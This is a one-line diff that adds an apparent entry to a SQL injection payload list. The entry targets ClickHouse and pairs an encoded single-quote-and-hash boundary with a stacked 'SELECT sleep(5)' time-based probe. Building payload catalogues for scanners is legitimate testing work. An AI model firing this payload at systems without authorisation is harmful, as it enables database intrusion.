@@ -1,0 +1,1 @@
+{"dbms": "clickhouse", "technique": "stacked", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B}; SELECT sleep(5)", "comment": "clickhouse stacked: single+enc hash"}
